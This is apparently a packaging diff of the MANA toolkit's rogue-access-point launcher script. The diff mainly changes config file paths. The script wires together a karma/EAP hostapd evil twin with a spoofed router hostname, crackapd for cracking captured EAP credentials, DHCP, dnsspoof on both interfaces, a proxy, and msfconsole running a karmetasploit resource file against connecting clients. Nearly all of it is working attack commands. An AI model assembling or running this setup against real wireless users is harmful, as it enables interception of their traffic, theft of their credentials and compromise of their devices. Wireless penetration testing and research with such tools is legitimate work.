@@ -1,8 +1,10 @@
+#!/bin/bash
+
 phy=wlan0
 phy0="wlan0_0"
-conf=conf/hostapd-karma-eap.conf
-hostapd=../hostapd-manna/hostapd/hostapd
-crackapd=../crackapd/crackapd.py
+conf=/etc/mana-toolkit/hostapd-karma-eap.conf
+hostapd=/usr/lib/mana-toolkit/hostapd
+crackapd=/usr/share/mana-toolkit/crackapd/crackapd.py
 
 hostname WRT54G
 echo hostname WRT54G
@@ -20,7 +22,7 @@ rfkill unblock wlan
 # Start hostapd
 sed -i "s/^interface=.*$/interface=$phy/" $conf
 sed -i "s/^bss=.*$/bss=$phy0/" $conf
-sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" conf/karmetasploit.rc
+sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" /etc/mana-toolkit/karmetasploit.rc
 $hostapd $conf&
 sleep 5
 ifconfig $phy
@@ -30,14 +32,14 @@ route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
 ifconfig $phy0 10.1.0.1 netmask 255.255.255.0
 route add -net 10.1.0.0 netmask 255.255.255.0 gw 10.1.0.1
 
-dhcpd -cf conf/dhcpd.conf $phy
-dhcpd -pf /var/run/dhcpd-two.pid -lf /var/lib/dhcp/dhcpd-two.leases -cf conf/dhcpd-two.conf $phy0
-dnsspoof -i $phy -f conf/dnsspoof.conf&
-dnsspoof -i $phy0 -f conf/dnsspoof.conf&
+dhcpd -cf /etc/mana-toolkit/dhcpd.conf $phy
+dhcpd -pf /var/run/dhcpd-two.pid -lf /var/lib/dhcp/dhcpd-two.leases -cf /etc/mana-toolkit/dhcpd-two.conf $phy0
+dnsspoof -i $phy -f /etc/mana-toolkit/dnsspoof.conf&
+dnsspoof -i $phy0 -f /etc/mana-toolkit/dnsspoof.conf&
 service apache2 start
 service stunnel4 start
-tinyproxy -c conf/tinyproxy.conf&
-msfconsole -r conf/karmetasploit.rc&
+tinyproxy -c /etc/mana-toolkit/tinyproxy.conf&
+msfconsole -r /etc/mana-toolkit/karmetasploit.rc&
 
 echo '1' > /proc/sys/net/ipv4/ip_forward
 iptables --policy INPUT ACCEPT
